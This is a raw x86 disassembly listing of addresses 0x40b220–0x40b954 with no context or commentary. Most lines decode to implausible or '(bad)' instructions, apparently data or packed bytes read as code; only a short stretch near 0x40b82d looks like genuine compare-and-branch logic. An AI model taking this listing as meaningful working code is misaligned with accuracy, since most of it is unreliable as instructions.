  40b220:	imul   esi,DWORD PTR [ebx],0xc
  40b223:	xlat   BYTE PTR ds:[bx]
  40b225:	inc    edx
  40b226:	jo     0x40b249
  40b228:	rcl    DWORD PTR [ebx+ebx*4-0x64],1
  40b22c:	dec    edi
  40b22d:	xor    ecx,edi
  40b22f:	xor    DWORD PTR [eax-0x589af2dc],0xffffffb8
  40b236:	sub    BYTE PTR [ebp-0xe],al
  40b239:	pop    esi
  40b23a:	(bad)  
  40b23b:	mov    esi,0x963baaea
  40b240:	rcl    BYTE PTR es:[edx+0x6],1
  40b244:	inc    ebx
  40b245:	add    BYTE PTR [esp-0x10019dae],bl
  40b24c:	ret    
  40b24d:	div    DWORD PTR [ebp+0x3e]
  40b250:	jbe    0x40b2bc
  40b252:	mov    ebx,0x86513cb5
  40b257:	sbb    edi,DWORD PTR [ecx]
  40b259:	mov    ch,0x7c
  40b25b:	jmp    0xe5ab:0xcc425a8a
  40b262:	push   es
  40b263:	ins    BYTE PTR es:[edi],dx
  40b264:	mov    esp,0x858d49fe
  40b269:	pusha  
  40b26a:	mov    BYTE PTR [edx],dh
  40b26c:	adc    BYTE PTR [eax+eiz*1+0x3633a051],dh
  40b273:	mov    gs,esi
  40b275:	leave  
  40b276:	cmp    esp,DWORD PTR [esi]
  40b278:	fbstp  TBYTE PTR [ebp-0x1]
  40b27b:	and    eax,0xce247d5f
  40b280:	iret   
  40b281:	xchg   edx,eax
  40b282:	mov    dh,0x70
  40b284:	repz push esi
  40b286:	popa   
  40b287:	pop    edx
  40b288:	test   ebx,ebp
  40b28a:	push   ds
  40b28b:	jno    0x40b2ec
  40b28d:	ds push edi
  40b28f:	inc    ecx
  40b290:	pop    edx
  40b291:	add    DWORD PTR [ebx],edx
  40b293:	sbb    eax,0x1de208a4
  40b298:	jg     0x40b23f
  40b29a:	xlat   BYTE PTR ds:[ebx]
  40b29b:	das    
  40b29c:	hlt    
  40b29d:	inc    edx
  40b29e:	and    cl,BYTE PTR [edx]
  40b2a0:	xor    dl,bl
  40b2a2:	cmp    BYTE PTR [ecx-0x1c],dl
  40b2a5:	cdq    
  40b2a6:	arpl   WORD PTR cs:[ebp+0x2ed34695],si
  40b2ad:	mov    bl,0x19
  40b2af:	cwde   
  40b2b0:	mov    dh,0x8b
  40b2b2:	push   eax
  40b2b3:	inc    ecx
  40b2b4:	ja     0x40b321
  40b2b6:	out    0xb9,eax
  40b2b8:	leave  
  40b2b9:	push   0xffffffa5
  40b2bb:	pop    ebp
  40b2bc:	xchg   edx,eax
  40b2bd:	inc    edi
  40b2be:	push   es
  40b2bf:	jo     0x40b2f2
  40b2c1:	(bad)  
  40b2c3:	or     ch,cl
  40b2c5:	jmp    0x33476425
  40b2ca:	ins    BYTE PTR es:[edi],dx
  40b2cb:	retf   
  40b2cc:	pop    esi
  40b2cd:	and    BYTE PTR [edx-0x62],0xe7
  40b2d1:	les    ebp,FWORD PTR [esi]
  40b2d3:	rep lods ax,WORD PTR ds:[si]
  40b2d7:	xlat   BYTE PTR ds:[ebx]
  40b2d8:	cwde   
  40b2d9:	pop    ss
  40b2da:	adc    eax,0xdf4346d4
  40b2df:	xor    ch,bh
  40b2e1:	xchg   esi,eax
  40b2e2:	scas   eax,DWORD PTR es:[edi]
  40b2e3:	test   eax,0x4d6338ec
  40b2e8:	(bad)  
  40b2e9:	aas    
  40b2ea:	test   al,0x96
  40b2ec:	mov    ecx,0x65e6d8d7
  40b2f1:	into   
  40b2f2:	mov    ch,0xf8
  40b2f4:	sahf   
  40b2f5:	out    0xd1,eax
  40b2f7:	sar    esp,1
  40b2f9:	lods   eax,DWORD PTR ds:[esi]
  40b2fa:	add    eax,0xa8e6e6c2
  40b2ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b300:	mov    ecx,0xb19321fc
  40b305:	outs   dx,BYTE PTR ds:[esi]
  40b306:	mov    eax,0x2a124b8
  40b30b:	hlt    
  40b30c:	xchg   edx,eax
  40b30d:	in     al,0xbf
  40b30f:	fistp  DWORD PTR ds:0x9b35c4fd
  40b315:	stos   BYTE PTR es:[edi],al
  40b316:	xchg   BYTE PTR [esi+ebp*1],al
  40b319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b31a:	mov    al,ds:0x4dc02424
  40b31f:	mov    edx,0xd43c79e3
  40b324:	out    dx,al
  40b325:	push   ds
  40b326:	jae    0x40b364
  40b328:	shl    BYTE PTR [ebx-0x322fead7],cl
  40b32e:	and    dl,BYTE PTR [ecx+0x16e6c111]
  40b334:	sbb    al,0xea
  40b336:	jo     0x40b329
  40b338:	lock sub eax,0x4a0f6688
  40b33e:	mov    dh,0x89
  40b340:	out    0x86,eax
  40b342:	sub    eax,DWORD PTR [edx-0x4e7d2451]
  40b348:	xor    eax,0xddd9d59c
  40b34d:	xlat   BYTE PTR ds:[ebx]
  40b34e:	jo     0x40b2f4
  40b350:	frstor [ebx+eiz*8]
  40b353:	iret   
  40b354:	and    DWORD PTR [edx+0x6256b812],edx
  40b35a:	into   
  40b35b:	retf   0x80a4
  40b35e:	add    eax,0x3e458395
  40b363:	push   esi
  40b364:	sar    DWORD PTR [edx+0x7b],cl
  40b367:	dec    esi
  40b368:	aam    0xe7
  40b36a:	cmc    
  40b36b:	jle    0x40b319
  40b36d:	xchg   bh,cl
  40b36f:	xchg   ebp,eax
  40b370:	xchg   ebp,eax
  40b371:	dec    esp
  40b372:	es push edx
  40b374:	jo     0x40b2f7
  40b376:	rol    BYTE PTR [ecx+0x3],1
  40b379:	mov    dl,0x5b
  40b37b:	in     eax,0xb0
  40b37d:	push   edi
  40b37e:	(bad)  
  40b37f:	in     al,0x52
  40b381:	not    DWORD PTR [ecx+0x79]
  40b384:	enter  0xd407,0x3
  40b388:	add    DWORD PTR [edi-0x34af4b53],ebp
  40b38e:	jo     0x40b36f
  40b390:	sbb    DWORD PTR [eax],edi
  40b392:	jmp    0x40b3b0
  40b394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b395:	repnz int 0x6b
  40b398:	int    0x5f
  40b39a:	xchg   ebp,eax
  40b39b:	or     DWORD PTR [edi+ebx*8-0x5e],esp
  40b39f:	mov    ecx,0x3e444aa3
  40b3a4:	out    dx,eax
  40b3a5:	frndint 
  40b3a7:	xlat   BYTE PTR ds:[ebx]
  40b3a8:	or     dl,BYTE PTR [edi+0x36]
  40b3ab:	fimul  DWORD PTR [ecx+0x37]
  40b3ae:	ret    0xe377
  40b3b1:	jmp    0x40b3dd
  40b3b3:	mov    ah,0x63
  40b3b5:	lods   al,BYTE PTR ds:[esi]
  40b3b6:	cld    
  40b3b7:	adc    eax,ebx
  40b3b9:	jmp    0x40b400
  40b3bb:	or     esp,DWORD PTR [esi]
  40b3bd:	(bad)  
  40b3bf:	mov    al,ds:0x8f1f21a
  40b3c4:	loopne 0x40b3b0
  40b3c6:	imul   BYTE PTR [eax-0x4974e0d1]
  40b3cc:	stc    
  40b3cd:	push   cs
  40b3ce:	push   ds
  40b3cf:	sbb    eax,DWORD PTR ds:0x936be60b
  40b3d5:	lahf   
  40b3d6:	add    al,0x9
  40b3d8:	lods   eax,DWORD PTR ds:[esi]
  40b3d9:	clc    
  40b3da:	addr16 xchg ebx,eax
  40b3dc:	stos   BYTE PTR es:[edi],al
  40b3dd:	not    DWORD PTR [esi]
  40b3df:	mov    edi,esp
  40b3e1:	xchg   edx,eax
  40b3e2:	jp     0x40b3ba
  40b3e4:	adc    BYTE PTR [ecx+0x40795a9c],0x82
  40b3eb:	push   esp
  40b3ec:	loopne 0x40b3f9
  40b3ee:	(bad)  
  40b3ef:	jns    0x40b46e
  40b3f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3f2:	jmp    0x40b41a
  40b3f4:	pop    edi
  40b3f5:	fst    DWORD PTR [eax+0x63316d5a]
  40b3fb:	adc    DWORD PTR [ecx-0x29ec0cb5],0x2b
  40b402:	fistp  QWORD PTR [ebx]
  40b404:	fimul  DWORD PTR [edi]
  40b406:	xchg   DWORD PTR [edi],ebx
  40b408:	add    al,0x0
  40b40a:	add    BYTE PTR [ebx-0x58162bab],cl
  40b410:	or     BYTE PTR [eax],al
  40b412:	add    cl,ch
  40b414:	adc    al,BYTE PTR [eax+eax*1]
  40b417:	add    bl,dl
  40b419:	dec    edi
  40b41a:	int3   
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x26
  40b425:	gs add eax,edx
  40b428:	call   0x70bf32b3
  40b42d:	jns    0x40b4ad
  40b42f:	jle    0x40b48a
  40b431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b432:	inc    esi
  40b433:	ds pop ds
  40b435:	into   
  40b436:	repnz inc esi
  40b438:	and    DWORD PTR [esi],0xffffffa2
  40b43b:	out    0x67,al
  40b43d:	fst    DWORD PTR [edx+edi*1+0x316e6110]
  40b444:	lods   eax,DWORD PTR ds:[esi]
  40b445:	and    esi,DWORD PTR [edx+eiz*4-0x3f]
  40b449:	mov    WORD PTR [ebp+edi*4+0x53],fs
  40b44d:	stos   BYTE PTR es:[edi],al
  40b44e:	xchg   edi,ebp
  40b450:	or     al,0x2a
  40b452:	fild   QWORD PTR [edx]
  40b454:	dec    ecx
  40b455:	push   ds
  40b456:	cld    
  40b457:	xchg   edx,eax
  40b458:	stos   BYTE PTR es:[edi],al
  40b459:	xchg   ecx,eax
  40b45a:	aaa    
  40b45b:	push   cs
  40b45c:	mov    edi,0xd5784304
  40b461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b462:	xchg   esp,eax
  40b463:	adc    al,0x16
  40b465:	mov    esi,0xbf3ee243
  40b46a:	xchg   ecx,eax
  40b46b:	inc    ecx
  40b46c:	mov    al,0xa5
  40b46e:	sti    
  40b46f:	mov    DWORD PTR [eax+0x32],ebp
  40b472:	iret   
  40b473:	and    cl,BYTE PTR [ecx+0x6432d4ad]
  40b479:	nop
  40b47a:	mov    ch,0x10
  40b47c:	jmp    0x1ba95194
  40b481:	sti    
  40b482:	sahf   
  40b483:	or     al,0x40
  40b485:	mov    esp,0x1ee5d417
  40b48a:	xchg   ecx,eax
  40b48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b48c:	fild   WORD PTR [edx-0x4]
  40b48f:	mov    bl,0x26
  40b491:	pushf  
  40b492:	sub    ah,BYTE PTR [eax]
  40b494:	mov    DWORD PTR [ebp+ebx*4-0x51],edi
  40b498:	jge    0x40b42e
  40b49a:	lods   al,BYTE PTR ds:[esi]
  40b49b:	add    DWORD PTR [eax-0x6465f474],esp
  40b4a1:	jno    0x40b48c
  40b4a3:	sbb    eax,0x7b684d6c
  40b4a8:	shr    DWORD PTR [esi],cl
  40b4aa:	xchg   edx,eax
  40b4ab:	jmp    DWORD PTR [ebp+0x6bc56804]
  40b4b1:	xchg   ebp,eax
  40b4b2:	jmp    0x6b14fdd8
  40b4b7:	dec    esi
  40b4b8:	shl    DWORD PTR [edx-0xc],1
  40b4bb:	cwde   
  40b4bc:	into   
  40b4bd:	mov    al,0x35
  40b4bf:	sub    al,0x65
  40b4c1:	bound  edi,QWORD PTR [ebx+0x5e]
  40b4c4:	sahf   
  40b4c5:	fnsave [ebp+edi*2+0x303cccfa]
  40b4cc:	nop
  40b4cd:	lods   al,BYTE PTR ds:[esi]
  40b4ce:	fstp   TBYTE PTR [eax+edi*1-0x13]
  40b4d2:	mov    ebp,0x52f430d6
  40b4d7:	loope  0x40b4ae
  40b4d9:	test   DWORD PTR [esp+eax*8],esi
  40b4dc:	shl    DWORD PTR [ecx+0x5d],cl
  40b4df:	adc    edi,DWORD PTR [edi-0x66]
  40b4e2:	jmp    0x4be0de96
  40b4e7:	mov    eax,ds:0x1023c498
  40b4ec:	push   cs
  40b4ed:	icebp  
  40b4ee:	(bad)  
  40b4ef:	cmp    DWORD PTR [edx-0x66b5acb0],ebx
  40b4f5:	repz inc ecx
  40b4f7:	nop
  40b4f8:	xchg   BYTE PTR [ebp+0x1f414101],bl
  40b4fe:	pop    edx
  40b4ff:	cmp    al,0x7a
  40b501:	iret   
  40b502:	imul   esi,edi,0xffffff96
  40b505:	push   ss
  40b506:	test   esp,ecx
  40b508:	loop   0x40b57f
  40b50a:	ja     0x40b50c
  40b50c:	mov    al,0xc
  40b50e:	fisubr WORD PTR [esi-0x6]
  40b511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b512:	popf   
  40b513:	fild   WORD PTR [edx+0x7a]
  40b516:	xchg   DWORD PTR [edi-0x36],ebx
  40b519:	xlat   BYTE PTR ds:[ebx]
  40b51a:	lock popf 
  40b51c:	pop    ebp
  40b51d:	es xchg edx,eax
  40b51f:	stos   DWORD PTR es:[edi],eax
  40b520:	sub    eax,0x841d80f6
  40b525:	xchg   ebp,eax
  40b526:	arpl   WORD PTR [ebp+0x4a676a59],cx
  40b52c:	push   eax
  40b52d:	in     al,dx
  40b52e:	(bad)  
  40b52f:	inc    ebp
  40b530:	pusha  
  40b531:	pop    esi
  40b532:	aad    0xac
  40b534:	inc    esp
  40b535:	outs   dx,DWORD PTR ds:[esi]
  40b536:	jae    0x40b4e1
  40b538:	fcom   DWORD PTR [esi-0x71]
  40b53b:	sar    DWORD PTR [edx-0x2f],0xa6
  40b53f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b540:	je     0x40b4fd
  40b542:	ja     0x40b57b
  40b544:	test   BYTE PTR [ebp+0x4feb1de2],bl
  40b54a:	(bad)  
  40b54b:	sbb    DWORD PTR [edx+0x32],0xf494c8d1
  40b552:	adc    ebp,ebx
  40b554:	ret    
  40b555:	push   edi
  40b556:	and    bl,BYTE PTR [ecx+ecx*4+0x24]
  40b55a:	cwde   
  40b55b:	in     al,0x7f
  40b55d:	adc    DWORD PTR [ebx-0x417e1d56],edx
  40b563:	mov    esi,0x1513cb87
  40b568:	sbb    edx,ebx
  40b56a:	icebp  
  40b56b:	dec    esi
  40b56c:	mov    ah,0x23
  40b56e:	ret    0xccfc
  40b571:	scas   eax,DWORD PTR es:[edi]
  40b572:	cmp    esi,DWORD PTR [esi-0x2ff21760]
  40b578:	inc    ebp
  40b579:	mov    DWORD PTR [ecx+0x1e3f9727],0x68a99393
  40b583:	pop    esi
  40b584:	aas    
  40b585:	in     eax,dx
  40b586:	cmp    dl,BYTE PTR ds:0xa6496787
  40b58c:	sub    BYTE PTR [edx-0x59eacc68],bl
  40b592:	shl    dl,1
  40b594:	fcomp  DWORD PTR [ebx+0x5e]
  40b597:	xor    edx,esi
  40b599:	je     0x40b57f
  40b59b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b59c:	sub    esi,eax
  40b59e:	or     DWORD PTR [esp+0x157d4314],0xc
  40b5a6:	or     al,0xcb
  40b5a8:	ja     0x40b56b
  40b5aa:	hlt    
  40b5ab:	test   DWORD PTR [edi+0x18c2768],0xf6c934d3
  40b5b5:	test   DWORD PTR [ebx+ebp*1],edi
  40b5b8:	or     DWORD PTR [ecx-0x46],edi
  40b5bb:	pop    eax
  40b5bc:	sbb    DWORD PTR [edx+0x1ee4628c],edx
  40b5c2:	pop    edi
  40b5c3:	fld    QWORD PTR [ebp-0x303393d0]
  40b5c9:	and    ch,dh
  40b5cb:	into   
  40b5cc:	in     eax,0xd2
  40b5ce:	push   esi
  40b5cf:	xor    bl,BYTE PTR [edx-0x22cd690a]
  40b5d5:	pop    ds
  40b5d6:	fstp   TBYTE PTR [eax-0x6c]
  40b5d9:	or     eax,0x8ccdbe17
  40b5de:	std    
  40b5df:	arpl   dx,sp
  40b5e1:	fnsave [ebp-0x2]
  40b5e4:	(bad)  
  40b5e5:	ss inc esi
  40b5e7:	mov    eax,ds:0x7d8b68bf
  40b5ec:	lock int3 
  40b5ee:	out    0xb7,al
  40b5f0:	push   0x5b3785a6
  40b5f5:	sub    al,0xbd
  40b5f7:	xor    DWORD PTR [ebp-0x3],esi
  40b5fa:	popf   
  40b5fb:	ins    BYTE PTR es:[edi],dx
  40b5fc:	jle    0x40b60a
  40b5fe:	xor    dl,BYTE PTR [ebp+0x59b973c1]
  40b604:	xchg   ebp,eax
  40b605:	popa   
  40b606:	shr    BYTE PTR [ecx],0xab
  40b609:	sub    eax,0xa588e072
  40b60e:	clc    
  40b60f:	lea    eax,[edi]
  40b611:	loop   0x40b604
  40b613:	push   ecx
  40b614:	jle    0x40b5d0
  40b616:	dec    edi
  40b617:	aas    
  40b618:	sub    al,0x6e
  40b61a:	xchg   edx,eax
  40b61b:	inc    edi
  40b61c:	movhps QWORD PTR [edx-0x36],xmm3
  40b620:	mov    dh,BYTE PTR ds:0xc1d88acb
  40b626:	dec    edi
  40b627:	fst    DWORD PTR fs:[edi-0x7a096f69]
  40b62e:	sar    bl,cl
  40b630:	sbb    DWORD PTR [esi+0x638f5188],eax
  40b636:	pop    ebp
  40b637:	cwde   
  40b638:	inc    esi
  40b639:	add    al,cl
  40b63b:	xchg   edx,eax
  40b63c:	sbb    dh,BYTE PTR [ebp+0x5c72c652]
  40b642:	mov    BYTE PTR [esi],0xad
  40b645:	sub    ebx,DWORD PTR [edi]
  40b647:	dec    ecx
  40b648:	pushf  
  40b649:	pop    eax
  40b64a:	jp     0x40b658
  40b64c:	aaa    
  40b64d:	mov    ecx,0xc30835c8
  40b652:	push   ds
  40b653:	and    eax,0x5ed15422
  40b658:	push   es
  40b659:	jmp    0x40b643
  40b65b:	adc    bh,BYTE PTR [edx-0x36c18cb]
  40b661:	inc    edi
  40b662:	dec    ebx
  40b664:	push   edx
  40b665:	or     al,0x6b
  40b667:	pop    edx
  40b668:	ret    
  40b669:	cmp    DWORD PTR [ebx],esp
  40b66b:	ins    BYTE PTR es:[edi],dx
  40b66c:	out    0x8b,eax
  40b66e:	xlat   BYTE PTR ds:[ebx]
  40b66f:	jge    0x40b6a7
  40b671:	rcl    DWORD PTR [ebp-0x4],1
  40b674:	cld    
  40b675:	mov    esi,0xc5c46f69
  40b67a:	lods   al,BYTE PTR ds:[esi]
  40b67b:	mov    BYTE PTR [ebx-0x5f],dl
  40b67e:	and    BYTE PTR [ecx-0x2ead7835],al
  40b684:	mov    al,0x47
  40b686:	jle    0x40b6a3
  40b688:	fs (bad) 
  40b68a:	enter  0x58fb,0xf5
  40b68e:	ss push cs
  40b690:	in     al,dx
  40b691:	fisttp QWORD PTR [edi+eax*4+0x2d6a96a3]
  40b698:	ret    0x3bab
  40b69b:	(bad)  
  40b69c:	nop
  40b69d:	pusha  
  40b69e:	jbe    0x40b68e
  40b6a0:	shl    BYTE PTR [edi],0x8c
  40b6a3:	mov    eax,ds:0x6a00dfeb
  40b6a8:	inc    ecx
  40b6a9:	les    edx,FWORD PTR [ebp-0x597275e7]
  40b6af:	cmp    DWORD PTR [eax-0x4f],esp
  40b6b2:	mov    esi,0x41981c3a
  40b6b7:	mov    al,BYTE PTR [esi+0x2d]
  40b6ba:	pushf  
  40b6bb:	lea    esp,[ecx]
  40b6bd:	xor    DWORD PTR [ecx-0x12],ecx
  40b6c0:	mov    ebx,0x62acaa44
  40b6c5:	pop    esp
  40b6c6:	jmp    0xa11c:0xe23a559e
  40b6cd:	sbb    edx,DWORD PTR [edi-0x26]
  40b6d0:	push   es
  40b6d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6d2:	jno    0x40b654
  40b6d4:	stc    
  40b6d5:	push   ds
  40b6d6:	pop    ss
  40b6d7:	dec    edx
  40b6d8:	mov    esp,0xfe352a29
  40b6dd:	mov    esp,0xa78c108a
  40b6e2:	mov    ch,0xef
  40b6e4:	clc    
  40b6e5:	cdq    
  40b6e6:	push   0xf93a32a2
  40b6eb:	jo     0x40b66e
  40b6ed:	ja     0x40b72b
  40b6ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6f0:	cmc    
  40b6f1:	fidiv  DWORD PTR [esi]
  40b6f3:	jl     0x40b71a
  40b6f5:	test   BYTE PTR [ebx+0x422f74ea],dl
  40b6fb:	scas   eax,DWORD PTR es:[edi]
  40b6fc:	loope  0x40b70b
  40b6fe:	dec    ebx
  40b6ff:	pop    es
  40b700:	lahf   
  40b701:	push   cs
  40b702:	mov    ch,0x8
  40b704:	outs   dx,BYTE PTR ds:[esi]
  40b705:	xchg   esi,eax
  40b706:	mov    dl,0x61
  40b708:	aaa    
  40b709:	or     edx,eax
  40b70b:	pop    ebp
  40b70c:	dec    edx
  40b70d:	loopne 0x40b73b
  40b70f:	jmp    0x62a5:0x1fe73515
  40b716:	ins    BYTE PTR es:[edi],dx
  40b717:	dec    ecx
  40b718:	or     edi,ebp
  40b71a:	cmp    eax,0x8b50d330
  40b71f:	inc    ecx
  40b720:	daa    
  40b721:	mov    esp,0x6a526aa8
  40b726:	and    BYTE PTR [ecx-0x6b],bh
  40b729:	arpl   si,bp
  40b72b:	dec    ecx
  40b72c:	dec    edx
  40b72d:	adc    DWORD PTR [esi],edx
  40b72f:	out    dx,al
  40b730:	xchg   esi,eax
  40b731:	mov    WORD PTR [eax],es
  40b733:	ficom  DWORD PTR [edx]
  40b735:	xor    al,0xa5
  40b737:	dec    eax
  40b738:	jecxz  0x40b776
  40b73a:	(bad)  
  40b73b:	pop    eax
  40b73c:	aas    
  40b73d:	jno    0x40b72a
  40b73f:	out    dx,al
  40b740:	add    al,0x2b
  40b742:	mov    esp,0x7b3cde80
  40b747:	adc    ebx,DWORD PTR [ebx+eiz*2]
  40b74a:	xor    BYTE PTR [eax-0x12ee8d79],ah
  40b750:	lods   al,BYTE PTR ds:[esi]
  40b751:	mov    edi,0xbe4a7224
  40b756:	sub    al,0x8
  40b758:	cmp    ch,cl
  40b75a:	rol    DWORD PTR [ebx],1
  40b75c:	pop    eax
  40b75d:	push   esi
  40b75e:	jbe    0x40b77a
  40b760:	sbb    eax,0xb83807e9
  40b765:	pop    edx
  40b766:	ds scas eax,DWORD PTR es:[edi]
  40b768:	cs sti 
  40b76a:	inc    ebp
  40b76b:	int3   
  40b76c:	mov    cl,0xde
  40b76e:	mov    cl,ah
  40b770:	test   DWORD PTR [eax+0x3ff5c76a],esi
  40b776:	rcr    DWORD PTR [ebx],1
  40b778:	adc    dl,dl
  40b77a:	add    eax,0xb828a5b5
  40b77f:	mov    bl,0x9a
  40b781:	sub    eax,0xddd44a20
  40b786:	ja     0x40b77d
  40b788:	jmp    FWORD PTR [ebx+0x6b]
  40b78b:	add    DWORD PTR [edi+eax*2],0x29ba54d4
  40b792:	push   ebp
  40b793:	pop    esp
  40b794:	call   0x3110:0xe13695c5
  40b79b:	jo     0x40b806
  40b79d:	inc    ebx
  40b79e:	clc    
  40b79f:	(bad)  [edx+0x23]
  40b7a2:	nop
  40b7a3:	les    ebp,FWORD PTR [edi+0x5413fc41]
  40b7a9:	imul   BYTE PTR fs:[edx-0x17]
  40b7ad:	jecxz  0x40b787
  40b7af:	les    eax,FWORD PTR [ecx+edx*8-0x7f]
  40b7b3:	gs xchg ebp,eax
  40b7b5:	scas   al,BYTE PTR es:[edi]
  40b7b6:	jle    0x40b79d
  40b7b8:	pop    esi
  40b7b9:	push   ebx
  40b7ba:	and    BYTE PTR [eax-0x70],cl
  40b7bd:	cmc    
  40b7be:	jae    0x40b79e
  40b7c0:	repz pop eax
  40b7c2:	mov    dl,0x13
  40b7c4:	adc    cl,0xb8
  40b7c7:	inc    ebp
  40b7c8:	out    dx,al
  40b7c9:	inc    ecx
  40b7ca:	dec    edx
  40b7cb:	mov    ecx,0x744c667d
  40b7d0:	sbb    al,0x8f
  40b7d2:	out    0x1c,al
  40b7d4:	repz sub ecx,DWORD PTR [edi]
  40b7d7:	adc    BYTE PTR [esi+0x47],ah
  40b7da:	nop
  40b7db:	(bad)  
  40b7dc:	(bad)  
  40b7dd:	add    DWORD PTR fs:[edx+ebp*8],esp
  40b7e1:	xor    ah,BYTE PTR [eax]
  40b7e3:	out    0x5e,al
  40b7e5:	rol    ebp,cl
  40b7e7:	std    
  40b7e8:	mov    ds:0xe15013a7,eax
  40b7ed:	imul   edi,esi,0x31
  40b7f0:	call   0x6a94:0x9cbbeb90
  40b7f7:	push   di
  40b7f9:	fs xchg ebx,eax
  40b7fb:	aaa    
  40b7fc:	cs out 0x4,al
  40b7ff:	lahf   
  40b800:	inc    eax
  40b801:	jle    0x40b7b2
  40b803:	sub    al,0xe5
  40b805:	aad    0x56
  40b807:	in     al,0x51
  40b809:	aaa    
  40b80a:	in     eax,0xfc
  40b80c:	mov    ecx,0x6f0819ac
  40b811:	sbb    ebx,DWORD PTR [esi-0x1df33a1e]
  40b817:	ret    0x7d58
  40b81a:	scas   eax,DWORD PTR es:[edi]
  40b81b:	adc    edx,DWORD PTR [ebp+0x5f4a7956]
  40b821:	fsub   DWORD PTR [ebx]
  40b823:	js     0x40b7e2
  40b825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b826:	subps  xmm4,xmm2
  40b829:	mov    ch,0x8b
  40b82b:	push   ebp
  40b82c:	int3   
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	mov    ah,0x9a
  40b8a6:	jnp    0x40b8c7
  40b8a8:	loop   0x40b82c
  40b8aa:	jle    0x40b92a
  40b8ac:	jo     0x40b927
  40b8ae:	jle    0x40b92e
  40b8b0:	stc    
  40b8b1:	aas    
  40b8b2:	add    al,0xeb
  40b8b4:	je     0x40b8ee
  40b8b6:	adc    BYTE PTR [esi],al
  40b8b8:	outs   dx,DWORD PTR ds:[esi]
  40b8b9:	imul   DWORD PTR ds:0xbe2880b1
  40b8bf:	retf   
  40b8c0:	jl     0x40b8e9
  40b8c2:	xchg   edi,eax
  40b8c3:	push   ecx
  40b8c4:	jne    0x40b91e
  40b8c6:	adc    esi,DWORD PTR [edx-0x40a16a1c]
  40b8cc:	jle    0x40b894
  40b8ce:	(bad)  
  40b8cf:	shr    BYTE PTR [ebp-0x5],1
  40b8d2:	jae    0x40b878
  40b8d4:	addr16 loope 0x40b93c
  40b8d7:	sbb    al,0x84
  40b8d9:	daa    
  40b8da:	lods   al,BYTE PTR ds:[esi]
  40b8db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8dc:	push   ebx
  40b8dd:	es mov edx,0xea3c2002
  40b8e3:	jmp    0xb63451a5
  40b8e8:	mov    ch,0x5b
  40b8ea:	push   esi
  40b8eb:	call   0x5e76:0x8d3c84a8
  40b8f2:	mov    esi,0xab6cb947
  40b8f7:	lea    eax,[esp+esi*8-0x531144a7]
  40b8fe:	jp     0x40b929
  40b900:	xchg   BYTE PTR ds:0x70637a2e,bh
  40b906:	data16 daa 
  40b908:	xchg   edx,eax
  40b909:	dec    edx
  40b90a:	xchg   edx,eax
  40b90b:	repz out 0x74,eax
  40b90e:	jno    0x40b963
  40b910:	mov    edi,0xfcfecf82
  40b915:	xchg   DWORD PTR [ecx-0x7e0f2a9a],edi
  40b91b:	(bad)  
  40b91c:	test   eax,0xdea8ff02
  40b921:	pop    ebx
  40b922:	retf   0x15c8
  40b925:	out    0x38,al
  40b927:	inc    esi
  40b928:	(bad)  
  40b929:	or     ecx,esp
  40b92b:	neg    ebx
  40b92d:	inc    ebx
  40b92e:	aad    0x8c
  40b930:	mov    ecx,DWORD PTR [edx+ecx*8+0x50]
  40b934:	es jbe 0x40b98b
  40b937:	inc    ebp
  40b938:	jbe    0x40b99e
  40b93a:	add    ebx,0xffffffbd
  40b93d:	jbe    0x40b904
  40b93f:	pop    ds
  40b940:	shl    bh,cl
  40b942:	inc    ebp
  40b943:	inc    ebp
  40b944:	pop    ecx
  40b945:	pop    es
  40b946:	mov    eax,0xe4e5283c
  40b94b:	scas   al,BYTE PTR es:[edi]
  40b94c:	data16 jmp 0x40b91e
  40b94f:	and    DWORD PTR cs:[ebp+0x20],edx
  40b953:	push   esp
  40b954:	inc    esp
